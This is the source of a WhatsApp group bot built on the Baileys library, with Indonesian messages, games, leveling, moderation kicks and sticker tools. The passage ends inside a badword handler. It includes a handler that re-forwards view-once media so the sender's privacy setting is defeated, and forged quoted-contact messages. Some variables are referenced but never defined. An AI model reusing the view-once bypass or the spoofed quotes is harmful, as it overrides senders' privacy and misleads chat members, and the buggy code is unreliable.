const {
    WAConnection,
	MessageType, 
	Presence,
	MessageOptions,
	Mimetype,
	WALocationMessage,
	WA_MESSAGE_STUB_TYPES,
	WA_DEFAULT_EPHEMERAL,
	ReconnectMode,
	ProxyAgent,
	ChatModification,
	GroupSettingChange,
	waChatKey,
	mentionedJid,
	processTime,
	Browsers,
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone")
const speed = require('performance-now')
const { spawn, exec, execSync } = require("child_process")
const ffmpeg = require('fluent-ffmpeg')
const twitterGetUrl = require("twitter-url-direct")
const googleImage = require('g-i-s')
//const brainly = require('brainly-scraper')
const fetch = require('node-fetch');
const crypto = require('crypto')
const ggs = require('google-it')
const request = require('request');
const yts = require( 'yt-search')
const ms = require('parse-ms')
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const toMs = require('ms')
const axios = require("axios")
const fs = require("fs-extra")
const util = require('util')
const got = require("got");
const qrcodes = require('qrcode');
const imgbb = require('imgbb-uploader');
const os = require('os');

// stickwm
const Exif = require('./lib/exif');
const exif = new Exif(); 
const { addCommands, checkCommands, deleteCommands } = require('./lib/autoresp')
const { downloadMenu, infoMenu, gameMenu, groupMenu, funMenu, wibuMenu, ownerMenu, stickerMenu, otherMenu, rulesBot } = require('./message/help.js')
const { getBuffer, getGroupAdmins, getRandom, runtime, sleep } = require('./lib/myfunc')
const { addBadword, delBadword, isKasar, addCountKasar, isCountKasar, delCountKasar } = require("./lib/badword");
const { fetchJson, getBase64, kyun, createExif } = require('./lib/fetch')
const { color, bgcolor } = require('./lib/color')
const { mess } = require('./message/mess')
const { Toxic } = require('./lib/Toxic.js')
const { cmdadd } = require('./lib/totalcmd.js')
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage')
const { isGame, gameAdd, givegame, cekGLimit } = require("./lib/limit");
const { onGoing, dadu, asupan } = require("./lib/otakudesu.js")
const { mediafireDl } = require('./lib/mediafire.js')
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { y2mateA, y2mateV } = require('./lib/y2mate')
const { ythd } = require('./lib/ytdl')
const { yta, ytv } = require("./lib/ytdl2");
const premium = require("./lib/premium");
const afk = require("./lib/afk");
const level = require("./lib/level");
const atm = require("./lib/atm");
const _sewa = require("./lib/sewa");
//const brainly = require('./lib/brainly')

//const ffmpeg = require("./ffmpeg")

var kuis = false
hit_today = []
ky_ttt = []
const setGelud = require('./lib/gameGelud.js')
const game = require("./lib/game");
tttawal= ["0️⃣","1️⃣","2️⃣","3️⃣","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣"]

join = '\`\`\`New Member\`\`\` \n \`\`\`Nama :\`\`\` \n \`\`\`Askot : \`\`\` \n \`\`\`Umur :\`\`\` \n \`\`\`Status :\`\`\` \n\n - [ 𝙎𝙀𝙇𝙁 𝘽𝙊𝙏 ] -'
leave = '\`\`\`Sayonaraa👋\`\`\`'

let fakeimage = fs.readFileSync("./media/Nakano.jpg")
let errorImg = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
let setting = JSON.parse(fs.readFileSync('./setting.json'))
banChats = false;
owner = setting.owner
gamewaktu = setting.gamewaktu

// Database
let antivo = JSON.parse(fs.readFileSync('./database/antiviewonce.json'));
let antidel = JSON.parse(fs.readFileSync("./database/antidelete.json"));

let badword = JSON.parse(fs.readFileSync('./database/badword.json'));
let grupbadword = JSON.parse(fs.readFileSync('./database/grupbadword.json'));
let senbadword = JSON.parse(fs.readFileSync('./database/senbadword.json'));
const samih = JSON.parse(fs.readFileSync('./src/simi.json'))
const commandsDB = JSON.parse(fs.readFileSync('./database/commands.json'))
const setiker = JSON.parse(fs.readFileSync('./src/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./src/video.json'))
const audionye = JSON.parse(fs.readFileSync('./src/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./src/image.json'))

let register = JSON.parse(fs.readFileSync('./database/user/register.json'))
let welkom = JSON.parse(fs.readFileSync('./database/group/welcome.json'))
let _premium = JSON.parse(fs.readFileSync('./database/user/premium.json'));
let _afk = JSON.parse(fs.readFileSync('./database/user/afk.json'));
let _leveling = JSON.parse(fs.readFileSync('./database/group/leveling.json'))
let _level = JSON.parse(fs.readFileSync('./database/user/level.json'))
let _uang = JSON.parse(fs.readFileSync('./database/user/uang.json'))
let glimit = JSON.parse(fs.readFileSync('./database/user/glimit.json'));
let antilink = JSON.parse(fs.readFileSync('./database/group/antilink.json'));
let antivirtex = JSON.parse(fs.readFileSync('./database/group/antivirtex.json'));
let mute = JSON.parse(fs.readFileSync('./database/group/mute.json'));
let _update = JSON.parse(fs.readFileSync('./database/bot/update.json'))
let sewa = JSON.parse(fs.readFileSync('./database/group/sewa.json'));
let _scommand = JSON.parse(fs.readFileSync('./database/bot/scommand.json'))
let ban = JSON.parse(fs.readFileSync('./database/user/banned.json'))


// GAME
let tebakanime = JSON.parse(fs.readFileSync('./database/tebakanime.json'))
let tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
let asahotak = JSON.parse(fs.readFileSync('./database/asahotak.json'))
let caklontong = JSON.parse(fs.readFileSync('./database/caklontong.json'))
let tebaksiapaaku = JSON.parse(fs.readFileSync('./database/tebaksiapaaku.json'))
let tebakbendera = JSON.parse(fs.readFileSync('./database/tebakbendera.json'))
let susunkata = JSON.parse(fs.readFileSync('./database/susunkata.json'))
let tebakata = JSON.parse(fs.readFileSync('./database/tebakata.json'))
let tebaklirik = JSON.parse(fs.readFileSync('./database/tebaklirik.json'))
let tebakjenaka = JSON.parse(fs.readFileSync('./database/tebakjenaka.json'))
let tebakimia = JSON.parse(fs.readFileSync('./database/tebakimia.json'))
let kuismath = JSON.parse(fs.readFileSync('./database/kuismath.json'))
let tebaklagu = JSON.parse(fs.readFileSync('./database/tebaklagu.json'))
let tebaktebakan = JSON.parse(fs.readFileSync('./database/tebaktebakan.json'))
let family100 = [];

// Sticker Cmd
const addCmd = (id, command) => {
    const obj = { id: id, chats: command }
    _scommand.push(obj)
    fs.writeFileSync('./database/bot/scommand.json', JSON.stringify(_scommand))
}

const getCommandPosition = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return position
    }
}

const getCmd = (id) => {
    let position = null
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            position = i
        }
    })
    if (position !== null) {
        return _scommand[position].chats
    }
}


const checkSCommand = (id) => {
    let status = false
    Object.keys(_scommand).forEach((i) => {
        if (_scommand[i].id === id) {
            status = true
        }
    })
    return status
}


module.exports = dimas = async (dimas, dim) => {
	try {
        if (!dim.hasNewMessage) return
        dim = dim.messages.all()[0]
		if (!dim.message) return
		if (dim.key && dim.key.remoteJid == 'status@broadcast') return
		if (dim.key.id.startsWith('3EB0') && dim.key.id.length === 12) return
		global.ky_ttt
		global.blocked
		dim.message = (Object.keys(dim.message)[0] === 'ephemeralMessage') ? dim.message.ephemeralMessage.message : dim.message
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const content = JSON.stringify(dim.message)
		const from = dim.key.remoteJid
		const type = Object.keys(dim.message)[0]        
        const cmd = (type === 'conversation' && dim.message.conversation) ? dim.message.conversation : (type == 'imageMessage') && dim.message.imageMessage.caption ? dim.message.imageMessage.caption : (type == 'videoMessage') && dim.message.videoMessage.caption ? dim.message.videoMessage.caption : (type == 'extendedTextMessage') && dim.message.extendedTextMessage.text ? dim.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
    const prefix = /^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~#%^&.?/\\©^z+*,;]/gi) : '!'
        body = (type === 'conversation' && dim.message.conversation.startsWith(prefix)) ? dim.message.conversation : (type == 'imageMessage') && dim.message[type].caption.startsWith(prefix) ? dim.message[type].caption : (type == 'videoMessage') && dim.message[type].caption.startsWith(prefix) ? dim.message[type].caption : (type == 'extendedTextMessage') && dim.message[type].text.startsWith(prefix) ? dim.message[type].text : (type == 'listResponseMessage') && dim.message[type].singleSelectReply.selectedRowId ? dim.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && dim.message[type].selectedButtonId ? dim.message[type].selectedButtonId : (type == 'stickerMessage') && (getCmd(dim.message[type].fileSha256.toString('base64')) !== null && getCmd(dim.message[type].fileSha256.toString('base64')) !== undefined) ? getCmd(dim.message[type].fileSha256.toString('base64')) : ""
		budy = (type === 'conversation') ? dim.message.conversation : (type === 'extendedTextMessage') ? dim.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
budy = (type === 'conversation') ? dim.message.conversation : (type === 'extendedTextMessage') ? dim.message.extendedTextMessage.text : ''
		const args = body.trim().split(/ +/).slice(1)
		hit_today.push(command)
		const arg = body.substring(body.indexOf(' ') + 1)
		const ar = args.map((v) => v.toLowerCase())
		const argz = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix) 
		if (isCmd) cmdadd()
		const totalhit = JSON.parse(fs.readFileSync('./database/totalcmd.json'))[0].totalcmd
        const q = args.join(' ')
const Bfake = fs.readFileSync ('./media/image/fake.jpeg','base64')
//const { match, stop, isMatched } = require('./lib/matchmaking')       
        const botNumber = dimas.user.jid
        const ownerNumber = setting.ownerNumber
		const ownerName = setting.ownerName
		const botName = setting.botName
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? dim.participant : dim.key.remoteJid
		let senderr = dim.key.fromMe ? dimas.user.jid : dim.key.remoteJid.endsWith('@g.us') ? dim.participant : dim.key.remoteJid
		const totalchat = await dimas.chats.all()
		const groupMetadata = isGroup ? await dimas.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
      //  const isGroupOwner = groupOwner.includes(sender) || false
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = dim.key.fromMe ? dimas.user.jid : dimas.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = dim.key.fromMe ? dimas.user.name : conts.notify || conts.vname || conts.name || '-'
        const mentionByTag = type == "extendedTextMessage" && dim.message.extendedTextMessage.contextInfo != null ? dim.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByreply = type == "extendedTextMessage" && dim.message.extendedTextMessage.contextInfo != null ? dim.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByreply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
		idttt = []
	    players1 = []
	    players2 = []
	    gilir = []
	    for (let t of ky_ttt){
	    idttt.push(t.id)
	    players1.push(t.player1)
	    players2.push(t.player2)
	    gilir.push(t.gilir)
}
	    const isTTT = isGroup ? idttt.includes(from) : false
	    isPlayer1 = isGroup ? players1.includes(sender) : false
        isPlayer2 = isGroup ? players2.includes(sender) : false
        const io = ["6282239202895@s.whatsapp.net", "6282239202895@s.whatsapp.net"]//
        const isOwner = io.includes(senderr)
        const _registered = JSON.parse(fs.readFileSync('./database/user/register.json'))
const isAntiviewonce = isGroup ? antivo.includes(from) : false;
const isAntidel = isGroup ? antidel.includes(from) : false;
const isBadword = isGroup ? grupbadword.includes(from) : false
        const isRegister = _registered.includes(sender)
        const isPremium = premium.checkPremiumUser(sender, _premium)
        const isSewa = _sewa.checkSewaGroup(from, sewa)
        const isAfkOn = afk.checkAfkUser(sender, _afk)
        const isLevelingOn = isGroup ? _leveling.includes(from) : false
        const isMuted = isGroup ? mute.includes(from) : false
        const isAntiLink = isGroup ? antilink.includes(from) : false
        const isAntiVirtex = isGroup ? antivirtex.includes(from) : false
        const isWelkom = isGroup ? welkom.includes(from) : false
        const shp  = '⬡'
        const lol = 'dimasGans'
        const isBanned = ban.includes(sender)
        // here button function
        selectedButton = (type == 'buttonsResponseMessage') ? dim.message.buttonsResponseMessage.selectedButtonId : ''

        responseButton = (type == 'listResponseMessage') ? dim.message.listResponseMessage.title : ''

        const gcount = setting.gcount
        
        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = dimas.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "Pilih Disini","listType": "SINGLE_SELECT","sections": list}}, {})
            return dimas.relayWAMessage(po, {waitForAck: true})
        }
        
        const isUrl = (url) => {
            return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
        }
        function monospace(string) {
            return '```' + string + '```'
        }   
        function jsonformat(string) {
            return JSON.stringify(string, null, 2)
        }
        function randomNomor(angka){
            return Math.floor(Math.random() * angka) + 1
        }
        const reply = (teks) => {
	      dimas.sendMessage(from, teks, text, {quoted:dim, thumbnail: fakeimage})
        }
        const sendMess = (hehe, teks) => {
           dimas.sendMessage(hehe, teks, text)
        }
        const mentions = (teks, memberr, id) => {
           (id == null || id == undefined || id == false) ? dimas.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/Nakano.jpg')}, extendedText, { sendEphemeral: true, contextInfo: { "mentionedJid": memberr } }) : dimas.sendMessage(from, {text: teks.trim(), jpegThumbnail: fs.readFileSync('./media/wpmobile.png')}, extendedText, { sendEphemeral: true, quoted: dim, contextInfo: { "mentionedJid": memberr } })
        }
        const sendText = (from, text) => {
           dimas.sendMessage(from, text, MessageType.text)
        }
        const textImg = (teks) => {
           return dimas.sendMessage(from, teks, text, {quoted: dim, thumbnail: fs.readFileSync('./media/Nakano.jpg')})
        }
        const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./media/Nakano.jpg')
        }}}
       const math = (teks) => {
           return Math.floor(teks)
       }
       const kick = function(from, orangnya){
	       for (let i of orangnya){
	       dimas.groupRemove(from, [i])
        }
        }
       const kickMember = async(id, target = []) => {
           let group = await dimas.groupMetadata(id)
           let owner = group.owner.replace("c.us", "s.whatsapp.net")
           let me = dimas.user.jid
           for (i of target) {
           if (!i.includes(me) && !i.includes(owner)) {
           await dimas.groupRemove(to, [i])
        } else {
           await dimas.sendMessage(id, "Not Premited!", "conversation")
           break
        }
    }
}
       const add = function(from, orangnya){
	       dimas.groupAdd(from, orangnya)
}
       const sendKontak = (from, nomor, nama, org = "") => {
	       const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + nama + '\n' + 'ORG:' + org + '\n' + 'TEL;type=CELL;type=VOICE;waid=' + nomor + ':+' + nomor + '\n' + 'END:VCARD'
	       dimas.sendMessage(from, {displayname: nama, vcard: vcard}, MessageType.contact, {quoted: freply})
}
      const hideTag = async function(from, text){
	       let anu = await dimas.groupMetadata(from)
	       let members = anu.participants
	       let ane = []
	       for (let i of members){
	       ane.push(i.jid)
}
	       dimas.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/Nakano.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}  
      const sendWebp = async(to, url) => {
           var names = Date.now() / 10000;
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, './sticker' + names + '.png', async function () {
           console.log('selesai');
           let filess = './sticker' + names + '.png'
           let asw = './sticker' + names + '.webp'
           exec(`ffmpeg -i ${filess} -vf "scale=512:512:force_original_aspect_ratio=increase,fps=40, crop=512:512" ${asw}`, (err) => {
           fs.unlinkSync(filess)
           if (err) return reply(`${err}`)
           exec(`webpmux -set exif ./sticker/data.exif ${asw} -o ${asw}`, async (error) => {
           if (error) return reply(`${error}`)
           dimas.sendMessage(from, fs.readFileSync(asw), sticker, {sendEphemeral:true, quoted:dim})
           fs.unlinkSync(asw)
});
});
});
}
const getRegisteredRandomId = () => {
            return register[Math.floor(Math.random() * register.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/register.json', JSON.stringify(_registered))
        }
        
        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const isRegistered = checkRegisteredUser(sender)
    //REGISTER
    const maaf = `*MAAF KAK ${pushname}, MIZUKI BELUM MENGENALI KAKAK*\n\n*KLIK TOMBOL "VERIFY" UNTUK DAFTAR>//<*`
    const mod = '\n\nYang pakai wa mod bisa ketik !verify\n_Di sarankan pakai profile sebelum verifikasi>//<_'
    const tombar = [
          {
            buttonId: `${prefix}verify`,
            buttonText: {
              displayText: `🔖VERIFY`,
            },
            type: 1,
              }]
              //GROUP ONLY
              const grupaja = `*MAAF KAK ${pushname} COMMAND HANYA BISA DI GUNAKAN DI GROUP*`
    const yok = 'Yang pakai wa mod bisa ketik !izumigroup'
    const torup = [
          {
            buttonId: `${prefix}ikyygroup`,
            buttonText: {
              displayText: `JOIN GROUP`,
            },
            type: 1,
              }]
      //vip mem
      const harusvip = `*MAAF KAK ${pushname} ANDA HARUS MENJADI MEMBER VIP AGAR BISA MENGGUNAKAN FITUR TERSEBUT*`
    const goprem = 'Klik "BUY PREMIUM"jika tertarik\nYang pakai wa mod bisa ketik !buypremium'
    const torem = [
          {
            buttonId: `${prefix}sewabot`,
            buttonText: {
              displayText: `🛒BUY PREMIUM`,
            },
            type: 1,
              }]
              /////////////
            const kiki = fs.readFileSync('./senku2.jpeg')

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
      const buttonMessage = {
        contentText: text1,
        footerText: desc1,
        buttons: but,
        headerType: 1,
      };
      dimas.sendMessage(
        id,
        buttonMessage,
        MessageType.buttonsMessage,
        options
      );
    };
       const sendMediaURL = async(to, url, text="", mids=[]) =>{
           if(mids.length > 0){
           text = normalizeMention(to, text, mids)
}                                     
           const fn = Date.now() / 10000;
           const filename = fn.toString()
           let mime = ""
           var download = function (uri, filename, callback) {
           request.head(uri, function (err, res, body) {
           mime = res.headers['content-type']
           request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
           download(url, filename, async function () {
           console.log('done');
           let media = fs.readFileSync(filename)
           let type = mime.split("/")[0]+"Message"
           if(mime === "image/gif"){
           type = MessageType.video
           mime = Mimetype.gif
}
           if(mime.split("/")[0] === "audio"){
           mime = Mimetype.mp4Audio
}
           dimas.sendMessage(to, media, type, {quoted: dim, mimetype: mime, caption: text, thumbnail: Buffer.alloc(0), contextInfo: {"mentionedJid": mids}})
                     
           fs.unlinkSync(filename)
});
}
      const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       dimas.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       dimas.sendMessage(from, hasil, type, options).catch(e => {
	       dimas.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
})
})
})
})
}

      const promoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await dimas.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = dimas.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await dimas.groupMakeAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
}
}
}
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/user/limit.json', JSON.stringify(_limit))
            }
        }
             
       
      const demoteAdmin = async function(to, target=[]){
           if(!target.length > 0) { return  reply("No target..") }
           let g = await dimas.groupMetadata(to)
           let owner = g.owner.replace("c.us","s.whatsapp.net")
           let me = dimas.user.jid
           for (i of target){
           if (!i.includes(me) && !i.includes(owner)){
           const res = await dimas.groupDemoteAdmin(to, [i])
           }else{
           reply("NOT PREMITED")
}
}
}
          let authorname = dimas.contacts[from] != undefined ? dimas.contacts[from].vname || dimas.contacts[from].notify : undefined	
          if (authorname != undefined) { } else { authorname = groupName }	
          function addMetadata(packname, author) {	
          if (!packname) packname = 'WABot'; if (!author) author = 'Bot';author = author.replace(/[^a-zA-Z0-9]/g, '');	
          let name = `${author}_${packname}`
          if (fs.existsSync(`./sticker/${name}.exif`)) return `./sticker/${name}.exif`
          const json = {	
         "sticker-pack-name": packname,
         "sticker-pack-publisher": author,
}
         const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
         const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	
         let len = JSON.stringify(json).length	
         let last	
         if (len > 256) {	
         len = len - 256	
         bytes.unshift(0x01)	
         } else {	
         bytes.unshift(0x00)	
}	
         if (len < 16) {	
         last = len.toString(16)	
         last = "0" + len	
         } else {	
         last = len.toString(16)	
}	
       const buf2 = Buffer.from(last, "hex")	
	   const buf3 = Buffer.from(bytes)	
	   const buf4 = Buffer.from(JSON.stringify(json))	
	   const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	
	   fs.writeFile(`./sticker/${name}.exif`, buffer, (err) => {	
	   return `./sticker/${name}.exif`	
})	
}

     const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Malam'
}
         const levelRole = level.getLevelingLevel(sender, _level)
        var role = 'Warrior III'
        if (levelRole <= 5) {
            role = 'Warrior II'
        } else if (levelRole <= 10) {
            role = 'Warrior I'
        } else if (levelRole <= 15) {
            role = 'Elite III'
        } else if (levelRole <= 20) {
            role = 'Elite II'
        } else if (levelRole <= 25) {
            role = 'Elite I'
        } else if (levelRole <= 30) {
            role = 'Master III'
        } else if (levelRole <= 35) {
            role = 'Master II'
        } else if (levelRole <= 40) {
            role = 'Master I'
        } else if (levelRole <= 45) {
            role = 'GrandMaster III'
        } else if (levelRole <= 50) {
            role = 'GrandMaster II'
        } else if (levelRole <= 55) {
            role = 'GrandMaster I'
        } else if (levelRole <= 60) {
            role = 'Epic III'
        } else if (levelRole <= 65) {
            role = 'Epic II'
        } else if (levelRole <= 70) {
            role = 'Epic I'
        } else if (levelRole <= 75) {
            role = 'Legend III'
        } else if (levelRole <= 80) {
            role = 'Legend II'
        } else if (levelRole <= 85) {
            role = 'Legend I'
        } else if (levelRole <= 90) {
            role = 'Mythic'
        } else if (levelRole <= 95) {
            role = 'Mythical Glory'
        } else if (levelRole >= 100) {
            role = 'Immortal'
        } 
        
       // FUNCTION LEVELING
       if (isGroup && !dim.key.fromMe && !level.isGained(sender) && isLevelingOn) {
       try {
       level.addCooldown(sender)
       const checkATM = atm.checkATMuser(sender, _uang)
       if (checkATM === undefined) atm.addATM(sender, _uang)
       const uangsaku = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       atm.addKoinUser(sender, uangsaku, _uang)
       const currentLevel = level.getLevelingLevel(sender, _level)
       const amountXp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
       const requiredXp = 10 * Math.pow(currentLevel, 2) + 50 * currentLevel + 100
       level.addLevelingXp(sender, amountXp, _level)
       if (requiredXp <= level.getLevelingXp(sender, _level)) {
       level.addLevelingLevel(sender, 1, _level)
       const userLevel = level.getLevelingLevel(sender, _level)
       const fetchXp = 10 * Math.pow(userLevel, 2) + 50 * userLevel + 100
       reply(`*「 LEVEL UP 」*\n\n➸ *Nama :* ${pushname}\n➸ *Xp :* ${level.getLevelingXp(sender, _level)} / ${fetchXp}\n➸ *Level :* ${currentLevel} -> ${level.getLevelingLevel(sender, _level)} 🆙 \n➸ *Role*: *${role}*\n\nCongrats!! 🎉🎉`)
} 
       } catch (err) {
       console.error(err)
}
}
        colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
        const { quotedMsg, isQuotedMsg, isBaileys } = dim
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

      // Anti link
      const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
        if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
            if (budy.match(/(https:\/\/chat.whatsapp.com)/gi)) {
                reply(`*「 GROUP LINK DETECTOR 」*\n\nSepertinya kamu mengirimkan link grup, maaf kamu akan di kick`)
                dimas.groupRemove(from, [sender])
            }
        }
        //ANTI VIRTEXXX
        if (isGroup && isAntiVirtex && !isOwner && !isGroupAdmins && isBotGroupAdmins){
        if (budy.length > 3500) {
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
dimas.groupRemove(from, [sender])
        }
    }
          if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json') && isGroup) {
    if (budy.toLowerCase() === "vote") {
    var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
    var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
    var fil = vote.map((v) => v.participant);
    if (fil.includes(sender)) {
      return mentions(
        "@" + sender.split("@")[0] + " Anda sudah vote",
        fil,
            true
          );
      } else {
        vote.push({
          participant: sender,
          voting: "✅",
          voted: sender
        });
        fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        var vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
       var _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
       var fil = vote.map((v) => v.participant);
        if (fil.includes(sender)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: sender,
            voting: "❌",
            devote: sender
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
    /** end vote **/
    
if (isGroup && isAntiviewonce && type == "viewOnceMessage") {
  dimas.sendMessage(from, `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`, text, {quoted: freply, contextInfo: { mentionedJid: [sender]}});
  var msg = { ...dim };
  msg.dim = dim.message.viewOnceMessage.message;
  msg.dim[Object.keys(msg.dim)[0]].viewOnce = false;
  dimas.copyNForward(from, msg);
}
    
                // Badword
        if (isGroup && isBadword && !isOwner && !isGroupAdmins && !fromMe){
            for (let kasar of badword){
                if (chats.toLowerCase().includes(kasar)){
                    if (isCountKasar(sender, senbadword)){
                        if (!isBotGroupAdmins) return reply(`Kamu beruntung karena bot bukan admin`)
                        reply(`*「 ANTI BADWORD 」*\n\nSepertinya kamu sudah berkata kasar lebih dari 5x, maaf kamu akan di kick`)
                        dimas.groupRemove(from, [sender])
                        delCountKasar(sender, senbadword)
                    } else {
                        addCountKasar(sender, senbadword)
                        reply(`Kamu terdeteksi berkata kasar\nJangan ulangi lagi atau kamu akan dikick`)
